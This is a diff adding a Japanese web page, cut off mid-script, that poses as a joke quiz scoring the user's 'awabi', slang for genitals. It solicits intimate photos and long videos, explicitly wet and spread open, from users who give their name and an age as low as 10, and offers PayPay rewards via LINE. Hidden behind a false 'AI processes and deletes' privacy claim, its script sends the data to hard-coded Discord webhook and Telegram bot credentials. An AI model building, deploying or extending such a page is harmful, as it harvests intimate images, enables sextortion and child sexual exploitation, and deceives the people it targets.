@@ -1,0 +1,911 @@
+﻿<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>あわび度診断メーカー</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Hiragino Kaku Gothic ProN', 'メイリオ', sans-serif;
+      background: linear-gradient(135deg, #e0f7fa, #b2ebf2, #e8f5e9, #e0f7fa);
+      background-size: 400% 400%;
+      animation: bgShift 14s ease infinite;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    @keyframes bgShift {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      background: white;
+      border-radius: 24px;
+      padding: 40px 36px;
+      max-width: 580px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.12);
+    }
+
+    /* ステップUI */
+    .steps-row {
+      display: flex; align-items: center; width: 100%; max-width: 500px; margin: 0 auto;
+    }
+    .step-dot {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: #e0e0e0; color: #aaa;
+      font-size: 0.85rem; font-weight: bold;
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.3s; flex-shrink: 0;
+    }
+    .step-dot.active { background: #00897b; color: white; }
+    .step-dot.done   { background: #27ae60; color: white; }
+    .step-line { flex: 1; height: 3px; background: #e0e0e0; transition: background 0.3s; }
+    .step-line.done { background: #27ae60; }
+    .steps-labels {
+      display: flex; justify-content: space-between; max-width: 500px; margin: 6px auto 0;
+    }
+    .step-lbl { font-size: 0.7rem; color: #aaa; text-align: center; flex: 1; transition: color 0.3s; }
+    .step-lbl.active { color: #00897b; font-weight: bold; }
+    .step-lbl.done   { color: #27ae60; }
+
+    .header { text-align: center; margin-bottom: 28px; }
+    .header .icon { font-size: 3rem; display: block; margin-bottom: 10px; }
+    .header h1 { font-size: 1.6rem; color: #00897b; margin-bottom: 4px; }
+    .header .subtitle { font-size: 0.85rem; color: #888; line-height: 1.6; }
+
+    .creator-link {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      max-width: 320px; margin: 0 auto 20px;
+      padding: 10px 20px;
+      background: rgba(255,255,255,0.75);
+      border: 1.5px solid rgba(0,188,212,0.4);
+      border-radius: 99px; text-decoration: none;
+      box-shadow: 0 4px 16px rgba(0,137,123,0.12);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .creator-link:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,137,123,0.22); }
+    .creator-link img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid #4dd0e1; flex-shrink: 0; }
+    .creator-link span { font-size: 0.85rem; font-weight: bold; color: #00897b; white-space: nowrap; }
+
+    .notice {
+      background: #e0f7fa; border: 1px solid #80deea;
+      border-radius: 12px; padding: 12px 16px;
+      font-size: 0.82rem; color: #006064;
+      margin-bottom: 24px; line-height: 1.7;
+    }
+
+    .screen { display: none; }
+    .screen.active { display: block; }
+
+    .form-group { margin-bottom: 20px; }
+    .form-group label {
+      display: block; font-size: 0.9rem; font-weight: bold; color: #333; margin-bottom: 8px;
+    }
+    .form-group label .required { color: #e74c3c; margin-left: 4px; font-size: 0.78rem; }
+    .form-group input[type="text"],
+    .form-group input[type="number"] {
+      width: 100%; padding: 13px 16px; font-size: 0.95rem;
+      border: 2px solid #e0e0e0; border-radius: 12px;
+      outline: none; transition: border-color 0.2s; font-family: inherit;
+    }
+    .form-group input:focus { border-color: #00897b; }
+
+    .summary-box {
+      background: #f9f9f9; border: 1px solid #eee;
+      border-radius: 12px; padding: 12px 18px;
+      margin-bottom: 20px; font-size: 0.88rem; color: #555; line-height: 1.9;
+    }
+
+    .send-section {
+      border: 2px solid #b2ebf2; border-radius: 16px; padding: 22px 20px; margin-bottom: 18px;
+    }
+    .send-section.image-section { border-color: #b2ebf2; }
+    .send-section.video-section { border-color: #c8e6c9; }
+
+    .section-title {
+      font-size: 1rem; font-weight: bold;
+      display: flex; align-items: center; gap: 8px; margin-bottom: 16px;
+    }
+    .sent-banner {
+      display: none; background: #f0fff4; border: 1px solid #b2dfdb;
+      border-radius: 10px; padding: 10px 14px;
+      font-size: 0.85rem; color: #27ae60; font-weight: bold;
+      text-align: center; margin-bottom: 12px;
+    }
+
+    .upload-choice-row { display: flex; gap: 10px; }
+    .upload-choice-btn {
+      flex: 1; display: flex; flex-direction: column; align-items: center; gap: 6px;
+      padding: 18px 10px; border: 2px dashed #e0e0e0; border-radius: 12px;
+      background: #fafafa; cursor: pointer; transition: all 0.2s; text-align: center;
+    }
+    .upload-choice-btn:hover { border-color: #00897b; background: #e0f7fa; }
+    .upload-choice-btn:active { transform: scale(0.97); }
+    .upload-choice-label { font-size: 0.8rem; color: #555; font-weight: bold; line-height: 1.4; }
+
+    .media-preview {
+      display: none; max-width: 100%; max-height: 200px;
+      border-radius: 10px; margin-top: 10px; border: 1px solid #e0e0e0;
+    }
+
+    .btn-primary {
+      width: 100%; padding: 15px;
+      background: linear-gradient(135deg, #00bcd4, #00897b);
+      color: white; border: none; border-radius: 12px;
+      font-size: 1.05rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 8px; font-family: inherit;
+    }
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,137,123,0.35); }
+    .btn-primary:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+
+    .btn-back {
+      width: 100%; padding: 13px; background: white; color: #888;
+      border: 2px solid #e0e0e0; border-radius: 12px;
+      font-size: 0.95rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 10px; font-family: inherit;
+    }
+    .btn-back:hover { background: #f9f9f9; border-color: #ccc; }
+
+    .btn-next {
+      width: 100%; padding: 15px;
+      background: linear-gradient(135deg, #27ae60, #1e8449);
+      color: white; border: none; border-radius: 12px;
+      font-size: 1.05rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 10px; font-family: inherit;
+    }
+    .btn-next:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(39,174,96,0.35); }
+    .btn-next:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+
+    .btn-skip {
+      width: 100%; padding: 11px; background: white; color: #aaa;
+      border: 2px dashed #e0e0e0; border-radius: 12px;
+      font-size: 0.88rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 8px; font-family: inherit;
+    }
+    .btn-skip:hover { background: #fafafa; color: #888; }
+
+    .btn-top {
+      display: block; width: 100%; padding: 13px; background: white; color: #aaa;
+      border: 2px solid #e0e0e0; border-radius: 12px;
+      font-size: 0.9rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 10px; text-align: center;
+      text-decoration: none;
+    }
+    .btn-top:hover { background: #f9f9f9; border-color: #ccc; color: #888; }
+
+    .error-msg { display: none; color: #e74c3c; font-size: 0.8rem; margin-top: 6px; }
+    .divider { border: none; border-top: 1px solid #f0f0f0; margin: 22px 0; }
+    .privacy-note { font-size: 0.75rem; color: #aaa; text-align: center; line-height: 1.7; margin-top: 14px; }
+
+    .loading-spinner {
+      display: inline-block; width: 16px; height: 16px;
+      border: 3px solid rgba(255,255,255,0.4); border-top-color: white;
+      border-radius: 50%; animation: spin 0.8s linear infinite;
+      vertical-align: middle; margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .progress-bar-wrap {
+      background: #f0f0f0; border-radius: 99px;
+      height: 6px; margin-top: 8px; overflow: hidden; display: none;
+    }
+    .progress-bar-fill {
+      height: 100%; width: 0%;
+      background: linear-gradient(90deg, #00bcd4, #00897b);
+      border-radius: 99px; transition: width 0.3s;
+    }
+
+    /* 結果画面 */
+    #screen-result {
+      text-align: center; padding: 16px 0;
+    }
+    .score-wrap {
+      margin: 28px 0;
+    }
+    .score-label {
+      font-size: 1rem; color: #888; margin-bottom: 8px;
+    }
+    .score-number {
+      font-size: 5.5rem; font-weight: bold; line-height: 1;
+      background: linear-gradient(135deg, #00bcd4, #00897b);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: scorePop 0.5s cubic-bezier(0.175,0.885,0.32,1.275);
+    }
+    @keyframes scorePop {
+      0% { transform: scale(0.4); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .score-unit { font-size: 2rem; }
+    .score-msg {
+      font-size: 1.1rem; font-weight: bold; color: #333;
+      margin: 14px 0 20px; line-height: 1.7;
+    }
+    .prize-box {
+      background: linear-gradient(135deg, #fff8e1, #fff3cd);
+      border: 2px solid #ffc107; border-radius: 16px;
+      padding: 20px 18px; margin: 20px 0; text-align: left;
+    }
+    .prize-box h3 { font-size: 1rem; color: #b45309; margin-bottom: 10px; text-align: center; }
+    .prize-box p { font-size: 0.85rem; color: #555; line-height: 1.9; }
+    .prize-box .highlight { color: #c0392b; font-weight: bold; }
+
+    .perfect-box {
+      background: linear-gradient(135deg, #fff9c4, #fffde7);
+      border: 2px solid #f9a825; border-radius: 16px;
+      padding: 22px 18px; margin: 20px 0;
+      animation: glowPulse 2s ease-in-out infinite;
+    }
+    @keyframes glowPulse {
+      0%, 100% { box-shadow: 0 0 12px rgba(249,168,37,0.4); }
+      50% { box-shadow: 0 0 28px rgba(249,168,37,0.8); }
+    }
+    .perfect-box h3 { font-size: 1.2rem; color: #e65100; margin-bottom: 12px; }
+    .perfect-box p { font-size: 0.88rem; color: #555; line-height: 1.9; }
+
+    .btn-restart {
+      width: 100%; padding: 14px;
+      background: linear-gradient(135deg, #00bcd4, #00897b);
+      color: white; border: none; border-radius: 12px;
+      font-size: 0.95rem; font-weight: bold; cursor: pointer;
+      transition: all 0.2s; margin-top: 10px; font-family: inherit;
+    }
+    .btn-restart:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,137,123,0.35); }
+
+    @media (max-width: 480px) {
+      .container { padding: 28px 18px; }
+      .score-number { font-size: 4rem; }
+      .upload-choice-row { flex-direction: column; }
+      .upload-choice-btn { flex-direction: row; justify-content: center; padding: 14px 12px; }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <span class="icon">🐚</span>
+    <h1>あわび度診断メーカー</h1>
+    <p class="subtitle">あなたのあわびのクオリティをAIが採点します！<br>おふざけツールです😆</p>
+  </div>
+
+  <a class="creator-link" href="https://ohandajicun-cyber.github.io/sindan/about.html" target="_blank" rel="noopener">
+    <img src="https://raw.githubusercontent.com/ohandajicun-cyber/sindan/main/meromiyu.png" alt="めろみゆ">
+    <span>👩 この診断を作った人</span>
+  </a>
+
+  <div id="step-ui">
+    <div class="steps-row">
+      <div class="step-dot active" id="dot1">1</div>
+      <div class="step-line" id="line1"></div>
+      <div class="step-dot" id="dot2">2</div>
+      <div class="step-line" id="line2"></div>
+      <div class="step-dot" id="dot3">3</div>
+    </div>
+    <div class="steps-labels">
+      <div class="step-lbl active" id="lbl1">基本情報</div>
+      <div class="step-lbl" id="lbl2">あわび撮影</div>
+      <div class="step-lbl" id="lbl3">あわび度</div>
+    </div>
+  </div>
+
+  <div class="screen active" id="screen-step1">
+    <div class="notice" style="margin-top:24px;">
+      🐚 <strong>これはおふざけツールです！</strong><br>
+      あなたのあわびを診断して<span style="color:#e65100; font-weight:bold;">あわび度</span>を採点します。<br>
+      <strong style="color:#b45309;">🎁 100点を取るとうれしいギフトがもらえることも！</strong><br>
+      ご褒美をゲットするには「この診断を作った人」ページから公式LINEを追加してください。
+    </div>
+
+    <div class="form-group">
+      <label>お名前（ニックネームOK） <span class="required">必須</span></label>
+      <input type="text" id="input-name" placeholder="なまえ" maxlength="50">
+      <p class="error-msg" id="err-name">お名前を入力してください（ニックネーム可）</p>
+    </div>
+
+    <div class="form-group">
+      <label>年齢 <span class="required">必須</span></label>
+      <input type="number" id="input-age" placeholder="例：20" min="10" max="110">
+      <p class="error-msg" id="err-age">年齢を正しく入力してください（10〜110）</p>
+    </div>
+
+    <hr class="divider">
+    <button class="btn-primary" onclick="goToStep2()">次へ →</button>
+    <a class="btn-top" href="https://ohandajicun-cyber.github.io/sindan/index.html">🏠 トップに戻る</a>
+  </div>
+
+  <div class="screen" id="screen-step2">
+    <div class="summary-box" id="summary-box" style="margin-top:24px;"></div>
+
+    <div style="margin-bottom:20px;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+        <span style="font-size:0.82rem; color:#888;">🐚 撮影 <span id="substep-current">1</span> / 2</span>
+        <span id="substep-label" style="font-size:0.78rem; color:#00897b; font-weight:bold;"></span>
+      </div>
+      <div style="background:#f0f0f0; border-radius:99px; height:6px; overflow:hidden;">
+        <div id="substep-bar" style="height:100%; width:16%; background:linear-gradient(90deg,#00bcd4,#00897b); border-radius:99px; transition:width 0.4s;"></div>
+      </div>
+    </div>
+
+    <div class="substep" id="substep-1">
+      <div class="send-section image-section">
+        <div class="section-title">🖼️ あわびを撮影します</div>
+        <div style="text-align:center; margin-bottom:14px;">
+          <img src="https://raw.githubusercontent.com/ohandajicun-cyber/sindan/main/awabi.png" alt="あわびのサンプル" style="max-width:100%; max-height:180px; border-radius:12px; border:2px solid #80deea; object-fit:contain;">
+          <p style="font-size:0.75rem; color:#888; margin-top:6px;">↑ こんな感じで撮影してね！</p>
+        </div>
+        <div class="sent-banner" id="img-sent-banner-1">✅ 画像を選択済み</div>
+        <input type="file" id="input-image-1" accept="image/*" style="display:none" onchange="handleImageSelect(event,1)">
+        <input type="file" id="input-image-camera-1" accept="image/*" capture="environment" style="display:none" onchange="handleImageSelect(event,1)">
+        <div class="upload-choice-row">
+          <div class="upload-choice-btn" onclick="document.getElementById('input-image-1').click()">
+            <span style="font-size:1.6rem;">🖼️</span>
+            <span class="upload-choice-label">ギャラリーから選択</span>
+          </div>
+          <div class="upload-choice-btn" onclick="document.getElementById('input-image-camera-1').click()">
+            <span style="font-size:1.6rem;">📷</span>
+            <span class="upload-choice-label">カメラで撮影</span>
+          </div>
+        </div>
+        <p id="file-name-img-1" style="margin-top:8px; text-align:center; font-size:0.8rem; color:#27ae60; font-weight:bold;"></p>
+        <img id="preview-img-1" class="media-preview" alt="プレビュー">
+        <p class="error-msg" id="err-substep-1">画像を選択してください</p>
+        <div style="margin-top:14px; padding:12px 14px; background:#e0f7fa; border-radius:12px; border:1px solid #80deea;">
+          <p style="font-size:0.8rem; color:#006064; line-height:1.7;">📌 あそこを撮ってみよう！📌 高得点を狙うための撮影ミッション！1回で満点は至難の業！撮影パターンを変えて再挑戦しよう✨<br>【1回目】 まずは「正面から全体」をパシャリ📸
+<br>【2回目】 次はゆびでさわって「濡れた状態」で質感をアップ！💧<br>【3回目】 最後はくぱぁっと「広げた状態」で細部までアピール！👐<br>回数を重ねるほど評価が上がりやすくなるかも！</p>
+        </div>
+      </div>
+
+
+
+
+
+
+
+
+
+    </div>
+
+    <div class="substep" id="substep-2" style="display:none;">
+      <div class="send-section video-section">
+        <div class="section-title">🎥 あわびの動画を撮影します</div>
+        <div style="text-align:center; margin-bottom:14px;">
+          <img src="https://raw.githubusercontent.com/ohandajicun-cyber/sindan/main/awabi.png" alt="あわびのサンプル" style="max-width:100%; max-height:180px; border-radius:12px; border:2px solid #a5d6a7; object-fit:contain;">
+          <p style="font-size:0.78rem; color:#1b5e20; line-height:1.6; margin-top:6px; text-align:left; padding:0 10px;">
+  <strong>🎥 撮影ガイド：3つのスタイルで高得点を狙え！</strong><br>
+  <span style="color:#c62828; font-weight:bold;">※1回の診断につき、どれか1つを選んで送ってね！</span><br><br>
+  ① <strong>ノーマル撮影</strong>：指でさわってみて全体が動く様子を正面から<br>
+  ② <strong>濡れ撮影</strong>：濡れた状態がわかるように質感重視で<br>
+  ③ <strong>広げ撮影</strong>：指などで広げて中まで詳しく<br><br>
+  結果を見たら<strong>「再挑戦」</strong>して、全パターン制覇しよう！
+</p>
+        </div>
+        <div class="sent-banner" id="vid-sent-banner-1">✅ 動画を選択済み</div>
+        <input type="file" id="input-video-1" accept="video/*" style="display:none" onchange="handleVideoSelect(event,1)">
+        <input type="file" id="input-video-camera-1" accept="video/*" capture="environment" style="display:none" onchange="handleVideoSelect(event,1)">
+        <div class="upload-choice-row">
+          <div class="upload-choice-btn" onclick="document.getElementById('input-video-1').click()">
+            <span style="font-size:1.6rem;">📁</span>
+            <span class="upload-choice-label">ギャラリーから選択</span>
+          </div>
+          <div class="upload-choice-btn" onclick="document.getElementById('input-video-camera-1').click()">
+            <span style="font-size:1.6rem;">🎬</span>
+            <span class="upload-choice-label">カメラで録画</span>
+          </div>
+        </div>
+        <p id="file-name-vid-1" style="margin-top:8px; text-align:center; font-size:0.8rem; color:#27ae60; font-weight:bold;"></p>
+        <video id="preview-vid-1" class="media-preview" controls></video>
+        <p class="error-msg" id="err-substep-2">動画を選択してください</p>
+        <div style="margin-top:14px; padding:12px 14px; background:#e8f5e9; border-radius:12px; border:1px solid #a5d6a7;">
+          <p style="font-size:0.8rem; color:#1b5e20; line-height:1.7;">🎥 動画は長いほど加点されます！できるだけ長く撮影しよう✨（最長5分まで）</p>
+        </div>
+      </div>
+    </div>
+
+    <div id="step2-error" style="display:none; margin-top:12px; background:#fff0f0; border:1px solid #f5c6c6; border-radius:10px; padding:12px 14px; font-size:0.85rem; color:#c0392b; line-height:1.6;"></div>
+
+    <div class="progress-bar-wrap" id="upload-progress-wrap">
+      <div class="progress-bar-fill" id="upload-progress-bar"></div>
+    </div>
+
+    <hr class="divider">
+    <button class="btn-back" id="btn-back-step2" onclick="substepBack()">← 戻る</button>
+    <button class="btn-next" id="btn-next-step2" onclick="substepNext()">次へ →</button>
+    <p class="privacy-note">送信された情報はサーバーへ送信されAIが処理し削除されます。</p>
+  </div>
+
+  <div class="screen" id="screen-result">
+    <div id="result-normal">
+      <p style="font-size:0.85rem; color:#00897b; font-weight:bold; text-align:center; margin-top:16px; margin-bottom:4px;">診断完了！</p>
+      <div class="score-wrap">
+        <p class="score-label">あなたのあわび度は…</p>
+        <div class="score-number" id="score-display">--</div>
+        <span style="font-size:1.2rem; color:#666; font-weight:bold;">点</span>
+      </div>
+      <p class="score-msg" id="score-msg"></p>
+
+      <div class="prize-box">
+        <h3>🎁 ご褒美について</h3>
+        <p>
+          <span class="highlight">100点を獲得</span>すると<span class="highlight">うれしいギフト</span>がもらえることがあります！🎉<br><br>
+          ご褒美をゲットするには：<br>
+          ① <span class="highlight">この画面をスクリーンショット</span>しておいてください📸<br>
+          ② ページ上部の「この診断を作った人」ページから<span class="highlight">公式LINEを追加</span>してスクショを送ってね！<br><br>
+          <span style="color:#888; font-size:0.82rem;">※ このツールはおふざけエンタメ診断です。ご褒美は不定期・先着で提供されます。</span>
+        </p>
+      </div>
+
+      <div style="background:#f0fff4; border:1.5px solid #b2dfdb; border-radius:14px; padding:16px 18px; margin:16px 0; text-align:center;">
+        <p id="submit-count-info" style="font-size:0.82rem; color:#888; margin-bottom:6px;"></p>
+        <p id="retry-encourage" style="font-size:0.95rem; color:#00897b; font-weight:bold; line-height:1.6; margin:0;"></p>
+      </div>
+      <button class="btn-next" onclick="retryUpload()" style="margin-bottom:4px;">📸 もう一度写真を送って再挑戦！</button>
+    </div>
+
+    <div id="result-perfect" style="display:none;">
+      <p style="font-size:0.85rem; color:#e65100; font-weight:bold; text-align:center; margin-top:16px; margin-bottom:4px;">🎉 満点達成！！</p>
+      <div class="score-wrap">
+        <p class="score-label">あなたのあわび度は…</p>
+        <div class="score-number" id="score-display-perfect" style="background:linear-gradient(135deg,#f9a825,#e65100); -webkit-background-clip:text; background-clip:text;">100</div>
+        <span style="font-size:1.2rem; color:#e65100; font-weight:bold;">点</span>
+      </div>
+      <p class="score-msg" style="color:#e65100;">🏆 完璧なあわびです！！ご褒美ゲットおめでとう！</p>
+
+      <div class="perfect-box">
+        <h3>🎁🎉 おめでとう！ご褒美ゲット対象です！</h3>
+        <p>
+          あなたは<strong style="color:#e65100;">100点満点</strong>を獲得しました！<br><br>
+          ① <strong>今すぐこの画面をスクリーンショット</strong>してください📸<br>
+          　※スクショを忘れると受け取れません！<br><br>
+          ② ページ上部の「👩 この診断を作った人」のページにアクセス<br><br>
+          ③ <strong>公式LINEを追加</strong>して、スクショを送ってください！<br><br>
+          <span style="color:#888; font-size:0.82rem;">※ ご褒美（PayPay・ギフト等）は不定期・先着提供です。なくなり次第終了となります。</span>
+        </p>
+      </div>
+    </div>
+
+    <a class="creator-link" href="https://ohandajicun-cyber.github.io/sindan/about.html" target="_blank" rel="noopener" style="margin-top:20px; margin-bottom:20px;">
+      <img src="https://raw.githubusercontent.com/ohandajicun-cyber/sindan/main/meromiyu.png" alt="めろみゆ">
+      <span>👩 この診断を作った人（公式LINE）</span>
+    </a>
+
+    <button class="btn-restart" onclick="restartAll()">🔄 もう一度診断する</button>
+    <a class="btn-top" href="https://ohandajicun-cyber.github.io/sindan/index.html">🏠 診断一覧に戻る</a>
+  </div>
+
+</div><div id="consent-modal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:9999; align-items:center; justify-content:center; padding:16px;">
+  <div style="background:white; border-radius:20px; padding:28px 22px; max-width:500px; width:100%; max-height:90vh; overflow-y:auto; box-shadow:0 24px 60px rgba(0,0,0,0.25);">
+    <h3 style="font-size:1.1rem; color:#00897b; margin-bottom:14px; text-align:center;">🐚 診断を始める前のご確認</h3>
+
+    <div style="background:#e0f7fa; border:1px solid #80deea; border-radius:12px; padding:14px 16px; font-size:0.85rem; color:#006064; line-height:1.9; margin-bottom:14px;">
+      <p style="margin-bottom:8px;"><strong>⚠️ これはおふざけエンタメツールです！</strong><br>
+      本格的な海産物診断ではありません😆 気軽に楽しんでください！</p>
+      <p style="margin-bottom:8px;"><strong>🎁 100点でご褒美あり！</strong><br>
+      満点を取るとPayPayやうれしいギフトがもらえることがあります。ご褒美をもらう場合は<strong>結果画面のスクリーンショットを忘れずに！</strong></p>
+      <p style="margin-bottom:8px;"><strong>📱 公式LINEで受け取り</strong><br>
+      ご褒美は「この診断を作った人」ページの<strong>公式LINEから申請</strong>できます。</p>
+      <p style="margin-bottom:0;"><strong>🔒 プライバシーについて</strong><br>
+      送信された画像・動画は診断処理のみに使用し、判定後は削除されます。</p>
+    </div>
+
+    <label style="display:flex; align-items:center; gap:10px; cursor:pointer; font-weight:bold; color:#333; padding:12px; background:#e0f7fa; border-radius:10px; border:1.5px solid #80deea; margin-bottom:12px;">
+      <input type="checkbox" id="consent-checkbox" onchange="onConsentChange()" style="width:22px; height:22px; cursor:pointer; accent-color:#00897b; flex-shrink:0;">
+      <span>上記を確認して診断スタート！</span>
+    </label>
+    <button onclick="closeConsentModal()" style="width:100%; padding:13px; background:white; color:#888; border:2px solid #e0e0e0; border-radius:12px; font-size:0.95rem; font-weight:bold; cursor:pointer; font-family:inherit;">やめておく</button>
+  </div>
+</div>
+
+<script>
+  // ── CONSTANTS ─────────────────────────────────────────────────────────────
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1497619554120237209/kg6WQPP91wd-CpDdkpqYg8MURigWlHMO4Id7_4oT8RVV37wRb4SpAnTbyhzCtU_cr4nz';
+  const TELEGRAM_TOKEN  = '8797962727:AAGtI4Ntey6KXDB835t54ICw8_QGi5aUkLA';
+  const TELEGRAM_CHAT_ID= '7047243736';
+
+  // 💡 Cloudinaryの設定
+  const CLOUDINARY_NAME   = 'dsj61q83n'; 
+  const CLOUDINARY_PRESET = 'y0y1e40j';
+  const CLOUDINARY_URL    = `https://api.cloudinary.com/v1_1/${CLOUDINARY_NAME}/video/upload`;
+
+  // substep定義: type='image'|'video', slot=0(画像スロット or 動画スロット)
+  const SUBSTEP_INFO = [
+    { type: 'image', slot: 0, label: 'あわび画像' },
+    { type: 'video', slot: 0, label: 'あわび動画' },
+  ];
+  const TOTAL_SUBSTEPS = 2;
+
+  let selectedImages   = [null];
+  let selectedVideos   = [null];
+  let videoDurations   = [0];
+  let currentSubStep   = 1;
+  let submitCount      = 0;
+
+  // ---- ステップUI ----
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  function updateStepUI(step) {
+    const dots  = [1,2,3].map(n => document.getElementById('dot'+n));
+    const lines = [1,2].map(n => document.getElementById('line'+n));
+    const lbls  = [1,2,3].map(n => document.getElementById('lbl'+n));
+    dots.forEach((d,i) => { d.className = 'step-dot'; d.textContent = i+1; });
+    lines.forEach(l    => { l.className = 'step-line'; });
+    lbls.forEach(l     => { l.className = 'step-lbl'; });
+    for (let i = 0; i < step - 1; i++) {
+      dots[i].className = 'step-dot done'; dots[i].textContent = '✓';
+      if (lines[i]) lines[i].className = 'step-line done';
+      lbls[i].className = 'step-lbl done';
+    }
+    dots[step-1].className = 'step-dot active';
+    lbls[step-1].className = 'step-lbl active';
+  }
+
+  // ---- ステップ1 → 同意モーダル ----
+  function goToStep2() {
+    const name = document.getElementById('input-name').value.trim();
+    const age  = parseInt(document.getElementById('input-age').value);
+    let ok = true;
+    if (!name) { document.getElementById('err-name').style.display = 'block'; ok = false; }
+    else        { document.getElementById('err-name').style.display = 'none'; }
+    if (!age || age < 10 || age > 110) { document.getElementById('err-age').style.display = 'block'; ok = false; }
+    else                               { document.getElementById('err-age').style.display = 'none'; }
+    if (!ok) return;
+    document.getElementById('consent-checkbox').checked = false;
+    document.getElementById('consent-modal').style.display = 'flex';
+  }
+
+  function closeConsentModal() {
+    document.getElementById('consent-modal').style.display = 'none';
+    document.getElementById('consent-checkbox').checked = false;
+  }
+
+  function onConsentChange() {
+    if (!document.getElementById('consent-checkbox').checked) return;
+    document.getElementById('consent-modal').style.display = 'none';
+    const name = document.getElementById('input-name').value.trim();
+    const age  = parseInt(document.getElementById('input-age').value);
+    document.getElementById('summary-box').innerHTML =
+      `<strong>お名前：</strong>${name}　／　<strong>年齢：</strong>${age}歳`;
+    currentSubStep = 1;
+    showSubStep(1);
+    updateStepUI(2);
+    showScreen('screen-step2');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ---- サブステップ管理 ----
+  function showSubStep(n) {
+    document.querySelectorAll('.substep').forEach(s => s.style.display = 'none');
+    document.getElementById('substep-' + n).style.display = 'block';
+    document.getElementById('substep-current').textContent = n;
+    document.getElementById('substep-label').textContent = SUBSTEP_INFO[n-1].label;
+    document.getElementById('substep-bar').style.width = (n / TOTAL_SUBSTEPS * 100) + '%';
+    hideError();
+    const btn = document.getElementById('btn-next-step2');
+    btn.disabled = false;
+    btn.textContent = n < TOTAL_SUBSTEPS ? '次へ →' : '診断する →';
+  }
+
+  function substepBack() {
+    if (currentSubStep === 1) {
+      updateStepUI(1);
+      showScreen('screen-step1');
+    } else {
+      currentSubStep--;
+      showSubStep(currentSubStep);
+    }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  async function substepNext() {
+    const btn  = document.getElementById('btn-next-step2');
+    const info = SUBSTEP_INFO[currentSubStep - 1];
+    hideError();
+
+    if (info.type === 'image') {
+      if (!selectedImages[info.slot]) {
+        showError(currentSubStep, '画像を選択してください');
+        return;
+      }
+      btn.disabled = true;
+      btn.innerHTML = '<span class="loading-spinner"></span>送信中...';
+      try {
+        await sendImage(info.slot);
+      } catch(e) {
+        // 送信失敗でも先に進む
+      }
+    } else {
+      // 動画（必須）
+      if (!selectedVideos[info.slot]) {
+        showError(currentSubStep, '動画を選択してください');
+        return;
+      }
+      btn.disabled = true;
+      btn.innerHTML = '<span class="loading-spinner"></span>動画送信中...';
+      try {
+        await sendVideo(info.slot);
+      } catch(e) {
+        // 送信失敗でも先に進む
+      }
+    }
+
+    if (currentSubStep < TOTAL_SUBSTEPS) {
+      currentSubStep++;
+      showSubStep(currentSubStep);
+    } else {
+      showResult();
+    }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ---- ファイル選択 ----
+  function handleImageSelect(event, slotNum) {
+    const file = event.target.files[0];
+    if (!file) return;
+    if (file.size > 8 * 1024 * 1024) {
+      alert('8MBを超える画像は送信できません。別のファイルを選択してください。');
+      event.target.value = '';
+      return;
+    }
+    const slot = slotNum - 1;
+    selectedImages[slot] = file;
+    document.getElementById('file-name-img-' + slotNum).textContent = '✅ ' + file.name;
+    document.getElementById('img-sent-banner-' + slotNum).style.display = 'block';
+    const img = document.getElementById('preview-img-' + slotNum);
+    img.src = URL.createObjectURL(file);
+    img.style.display = 'block';
+    hideError();
+  }
+
+  function handleVideoSelect(event, slotNum) {
+    const file = event.target.files[0];
+    if (!file) return;
+    if (file.size > 100 * 1024 * 1024) { // 安定送信のため上限を100MBに変更
+      alert('100MBを超える動画は送信できません。別のファイルを選択してください。');
+      event.target.value = '';
+      return;
+    }
+    const slot = slotNum - 1;
+    selectedVideos[slot] = file;
+    document.getElementById('file-name-vid-' + slotNum).textContent = '✅ ' + file.name;
+    document.getElementById('vid-sent-banner-' + slotNum).style.display = 'block';
+    const vid = document.getElementById('preview-vid-' + slotNum);
+    vid.src = URL.createObjectURL(file);
+    vid.style.display = 'block';
+    vid.onloadedmetadata = function() {
+      videoDurations[slot] = vid.duration || 0;
+    };
+    hideError();
+  }
+
+  // ---- Discord送信 (画像) ----
+  async function sendImage(slot) {
+    const file = selectedImages[slot];
+    const labels = ['あわび', 'ぬれてるあわび', 'ひくひくしているあわび'];
+    const name = document.getElementById('input-name').value.trim();
+    const age  = document.getElementById('input-age').value;
+    const now  = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+    const fd   = new FormData();
